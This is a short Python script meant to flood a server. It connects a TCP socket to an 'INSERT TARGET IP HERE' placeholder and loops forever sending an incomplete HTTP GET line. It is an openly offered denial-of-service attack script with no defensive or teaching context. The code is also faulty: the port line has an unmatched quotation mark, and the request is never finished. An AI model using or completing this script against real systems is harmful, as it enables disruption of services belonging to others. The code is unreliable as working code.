import socket

target_ip = "INSERT TARGET IP HERE"
target_port = INSERT TARGET PORT HERE"

# Create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the target
client_socket.connect((target_ip, target_port))

# Send a large number of requests to the target
while True:
    client_socket.send(b"GET / HTTP/1.1\r\n")
